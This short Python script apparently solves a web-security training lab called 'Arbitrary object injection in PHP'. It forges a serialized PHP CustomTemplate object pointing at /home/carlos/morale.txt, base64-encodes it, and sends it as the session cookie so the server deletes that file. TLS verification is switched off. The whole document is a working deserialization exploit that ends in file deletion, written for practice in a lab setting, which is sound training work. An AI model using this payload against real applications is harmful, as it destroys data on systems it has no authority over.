import requests
from colorama import Fore
import urllib3
import base64

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

LAB_NAME = "Arbitrary object injection in PHP"


def run(url, payload=None, proxies=None):
    url = url.rstrip('/')

    print("[1] Encoding the serialized object after modifying")
    serialized = """O:14:"CustomTemplate":1:{s:14:"lock_file_path";s:23:"/home/carlos/morale.txt";}"""
    serialized_encoded = base64.b64encode(serialized.encode()).decode()

    print("[2] Fetching the home page with the modified object as session to delete the morale.txt file")
    cookies = {"session": serialized_encoded}

    requests.get(f"{url}/", cookies=cookies, allow_redirects=False,
                 verify=False, proxies=proxies)
    return True
